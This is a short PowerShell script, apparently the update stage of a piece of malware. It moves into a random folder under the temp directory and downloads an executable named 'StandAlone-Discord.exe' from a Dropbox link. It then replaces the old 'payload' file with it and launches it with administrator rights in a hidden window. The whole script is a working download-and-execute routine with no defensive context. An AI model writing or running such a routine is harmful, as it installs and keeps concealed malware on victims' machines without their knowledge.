#change directory
cd $env:temp/sVBXKuz

#download updated payload
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile new_wsappa.exe

#remove old payload
remove-item wsappa.exe

#change name
rename-item new_wsappa.exe wsappa.exe

#start new payload
Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden
